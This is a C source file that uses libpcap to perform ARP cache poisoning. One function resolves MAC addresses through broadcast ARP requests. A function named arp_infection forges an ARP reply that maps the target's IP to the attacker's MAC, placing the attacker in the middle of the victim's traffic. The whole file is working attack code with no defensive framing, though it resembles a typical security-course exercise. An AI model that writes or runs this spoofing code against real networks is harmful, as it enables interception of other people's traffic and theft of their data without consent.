#include "include.h"

/*      Make ARP Request Packet      */
void get_mac(pcap_t* handle, char * dev, uint8_t * Sender_IP, uint8_t * Sender_MAC)
{

    const u_char * ARP_REQ_PACKET = (u_char*)malloc(sizeof(u_char) *(ETHER_HEADER_SIZE+ARP_HEADER_SIZE));
    ETH_header * eth_REQ = (ETH_header *)ARP_REQ_PACKET;
    ARP_header * arp_REQ = (ARP_header *)(ARP_REQ_PACKET+ETHER_HEADER_SIZE);
    uint8_t My_MAC[6];
    uint8_t My_IP[4];

    /*        Get my IP and Mac          */
    GET_MY_IP_MAC(dev, My_IP, My_MAC);

    printf("----------------Let's Make ARP Request Packet-----------------\n");
    for(int j=0; j<6; j++)
        eth_REQ->dmac[j]=0xFF;
    memcpy(eth_REQ->smac, My_MAC, 6);
    eth_REQ->type = htons(0x0806);

    arp_REQ->htype = htons(0x0001);
    arp_REQ->ptype = htons(0x0800);
    arp_REQ->hlen = 0x06;
    arp_REQ->plen = 0x04;
    arp_REQ->oper = htons(0x0001);

    memcpy(arp_REQ->smac, My_MAC, 6);
    memcpy(arp_REQ->sip, My_IP, 4);
    for(int j=0; j<6; j++)
        arp_REQ->dmac[j] = 0x00;
    memcpy(arp_REQ->dip, Sender_IP, 4);

    /*************************************************************************************************/

    /*      Send ARP Request Packet and Get Sender MAC     */

    while (1)
    {
        struct pcap_pkthdr* header;
        const u_char* packet;
        printf("send ARP Request Packet...\n");
        sleep(1);
        pcap_sendpacket(handle, ARP_REQ_PACKET, ETHER_HEADER_SIZE+ARP_HEADER_SIZE);
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;



        ETH_header * eth_GET = (ETH_header *)packet;


        if(memcmp(eth_GET->dmac, My_MAC, 6) || ntohs(eth_GET->type) != ETHERTYPE_ARP)
        {
            continue;
        }

        ARP_header * arp_GET = (ARP_header *)(packet+ETHER_HEADER_SIZE);

        if((ntohs(arp_GET->oper) != 0x0002) || memcmp(arp_GET->sip, Sender_IP, 4))
        {
            continue;
        }

        memcpy(Sender_MAC, eth_GET->smac, 6);
        printf("----------------Success GET Sender MAC-----------------\n");

        break;
    }
    /*************************************************************************************************/

    free((char*)ARP_REQ_PACKET);

    
}
bool arp_infection(pcap_t* handle, char * dev, uint8_t * Sender_IP, uint8_t * Target_IP, uint8_t * Sender_MAC, uint8_t * Target_MAC, bool First_time)
{ 

    if(First_time == true)
    {
        get_mac(handle, dev, Sender_IP, Sender_MAC); // get_sender_mac
        get_mac(handle, dev, Target_IP, Target_MAC); // get_target_mac
        First_time = false;
    }

    
    uint8_t My_MAC[6];
    uint8_t My_IP[4];

    /*        Get my IP and Mac          */
    GET_MY_IP_MAC(dev, My_IP, My_MAC);
    

    /*      Make ARP Reply Packet      */

    printf("----------------Let's Make ARP Reply Packet-----------------\n");
    const u_char * ARP_REP_PACKET = (u_char*)malloc(sizeof(u_char) *(ETHER_HEADER_SIZE+ARP_HEADER_SIZE));
    ETH_header * eth_REP = (ETH_header *)ARP_REP_PACKET;
    ARP_header * arp_REP = (ARP_header *)(ARP_REP_PACKET+ETHER_HEADER_SIZE);
    memcpy(eth_REP->dmac, Sender_MAC, 6);
    memcpy(eth_REP->smac, My_MAC, 6);
    eth_REP->type = htons(0x0806);

    arp_REP->htype = htons(0x0001);
    arp_REP->ptype = htons(0x0800);
    arp_REP->hlen = 0x06;
    arp_REP->plen = 0x04;
    arp_REP->oper = htons(0x0002);

    memcpy(arp_REP->smac, My_MAC, 6);
    memcpy(arp_REP->sip, Target_IP, 4);
    memcpy(arp_REP->dmac, Sender_MAC, 6);
    memcpy(arp_REP->dip, Sender_IP, 4);

    /*************************************************************************************************/

    /*      Send ARP Reply Packet     */

    printf("send ARP Reply Packet\n");
    pcap_sendpacket(handle, ARP_REP_PACKET, ETHER_HEADER_SIZE+ARP_HEADER_SIZE);

    /*************************************************************************************************/

    free((char *)ARP_REP_PACKET);
}
